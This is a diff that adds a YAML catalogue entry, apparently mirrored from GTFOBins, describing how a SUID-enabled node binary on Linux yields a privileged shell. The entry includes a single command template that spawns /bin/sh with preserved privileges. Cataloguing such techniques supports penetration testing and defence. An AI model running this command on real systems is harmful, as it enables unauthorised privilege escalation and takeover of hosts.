@@ -1,0 +1,24 @@
+id: gtfobins/node/shell/suid
+type: binary
+platform: linux
+name: node
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'node -e ''require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'''
+references:
+- https://gtfobins.github.io/gtfobins/node/
+tags:
+- linux
+- unix
+- gtfobins
